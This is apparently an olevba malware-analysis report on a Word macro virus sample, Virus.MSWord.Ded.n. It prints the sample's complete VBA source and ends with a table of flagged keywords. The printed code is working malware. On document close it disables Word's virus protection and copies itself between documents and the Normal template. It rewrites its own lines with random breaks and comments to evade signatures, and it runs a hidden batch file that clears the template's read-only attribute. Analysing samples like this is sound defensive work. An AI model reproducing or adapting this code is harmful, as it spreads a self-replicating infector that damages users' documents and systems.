olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.n-493775a00bb5113048946eb06c475e4705b3c5a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.n-493775a00bb5113048946eb06c475e4705b3c5a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Čäĺíňčôčęŕňîđ()

       End Sub
'36,40187
              Private Sub _
Document_New()

              End Sub
'10,63697
             Private Sub Document_Close()
'45,79715
    On _
Error GoTo skam

       Options.VirusProtection = _
False

         SWL
'25,72676
     ABS99
'50,60874
skam:
'59,60946
        End Sub
'0,024122
  Private _
Sub SWL()

  Application. _
                                      ShowVisualBasicEditor = False

    If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For I = 1 To NormalTemplate.VBProject. _
  VBComponents(1).CodeModule.CountOfLines

      d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

            If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

          While _
Mid(d, Len(d) - 1, 2) = " _"

    I _
= I + 1

           d = Left(d, _
Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

Wend
'95,67625
 d = _
e(d)

          ActiveDocument. _
                                                               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'80,25874
              Next _
I

  ActiveDocument. _
                              SaveAs AddToRecentFiles:=False

          End If
'44,11147
  End _
Sub

Private Sub ABS99()
'40,16046
      If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

f (NormalTemplate.FullName)
'34,69571
 For I = _
1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

          d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

           While _
Mid(d, Len(d) - 1, 2) = " _"

     I _
= I + 1

  d = Left(d, Len(d) - 1) & _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

    Wend
'42,58493
  d = e(d)
'37,74076
   NormalTemplate. _
   VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

       End _
If

             Next I
'96,26782
        NormalTemplate. _
                                      Save

            End If
'40,10364
              End _
Sub

         Private Function _
e(aString) As String

        aString = LTrim(aString)
'54,84239
    aString _
= RTrim(aString)

      If _
aString = "Sub " & "Vc()" Then

      aString = "Sub " & "ViewVBCode()"
'73,35107
           Else
'57,29536
  If aString = "Sub " & "ViewVBCode()" Then
'42,49291
         aString = "Sub " & "Vc()"
'28,35842
 End If
'30,00323
    End If
'13,56363
  For I _
= 1 To Len(aString) - 1

        If _
Mid(aString, I, 1) = "." Then

        If Not _
Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

      e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

  For _
j = 1 To Int(15 * Rnd)

 e _
= " " & e

          Next _
j

           Exit _
Function

             End _
If

   End _
If

 Else
'62,66841
         If Mid(aString, I, 1) = " " And Int(3 * _
Rnd) = 1 And I > 1 Then

      If Not Mid(aString, _
I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

For _
j = 1 To Int(15 * Rnd)

    e _
= " " & e

Next _
j

    Exit _
Function

        End If
'57,53485
         End If
'40,76948
          End If
'58,95553
 Next _
I

e _
= aString & Chr$(13) & "'" & (100 * Rnd)

    Count _
= Int(15 * Rnd)

      For _
j = 1 To Count

     e = " " & _
e

Next _
j

       End Function
'98,3534
        Private Sub _
f(fName)

              If GetAttr(fName) And vbReadOnly Then
'54,56762
           Open Dir(fName) & ".bat" For _
Append As #1

     Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

   Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
'98,79494
        Close _
#1

        shellResult = _
Shell(Dir(fName) & ".bat", vbHide)

    End If
'15,13002
           End Sub
'5,261064
         Private _
Sub Document_Open()

     End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

